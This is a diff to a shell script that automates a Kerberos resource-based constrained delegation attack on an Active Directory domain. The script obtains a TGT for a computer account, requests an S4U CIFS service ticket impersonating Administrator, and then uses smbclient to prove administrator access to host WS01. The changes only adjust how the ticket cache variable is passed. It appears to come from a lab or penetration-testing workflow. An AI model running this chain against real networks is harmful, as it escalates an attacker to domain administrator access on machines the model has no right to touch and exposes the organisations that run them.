@@ -75,15 +75,15 @@ EOF
 echo
 echo '===== OBTAIN PHASE03RBCD TGT ====='
 export KRB5_CONFIG="$KRB5_CONFIG_FILE"
-export KRB5CCNAME="FILE:$TGT_CACHE"
-printf "%s\n" "$PASSWORD" | "$KINIT" "${COMPUTER}@${REALM}"
+KRB5CCNAME="FILE:$TGT_CACHE" \
+  sh -c 'printf "%s\n" "$1" | exec "$2" "$3"' _ "$PASSWORD" "$KINIT" "${COMPUTER}@${REALM}"
 "$KLIST" -f -c "$TGT_CACHE"
 
 echo
 echo '===== REQUEST ADMINISTRATOR CIFS SERVICE TICKET ====='
 (
   cd "$WORK"
-  KRB5_CONFIG="$KRB5_CONFIG_FILE" KRB5CCNAME="FILE:$TGT_CACHE" \
+  KRB5_CONFIG="$KRB5_CONFIG_FILE" KRB5CCNAME="$TGT_CACHE" \
     "$GETST" \
       -k -no-pass \
       -dc-ip "$DC_IP" \
@@ -103,7 +103,7 @@ fi
 }
 
 echo "PASS: S4U service ticket created: $ST_CACHE"
-KRB5CCNAME="FILE:$ST_CACHE" "$KLIST" -c "$ST_CACHE"
+"$KLIST" -c "$ST_CACHE"
 
 cat >"$SMB_CMDS" <<'EOF'
 shares
@@ -114,8 +114,7 @@ EOF
 
 echo
 echo '===== PROVE ADMINISTRATOR CIFS ACCESS TO WS01 ====='
-export KRB5CCNAME="FILE:$ST_CACHE"
-"$SMBCLIENT" \
+KRB5CCNAME="$ST_CACHE" "$SMBCLIENT" \
   -k -no-pass \
   -dc-ip "$DC_IP" \
   -target-ip "$TARGET_IP" \
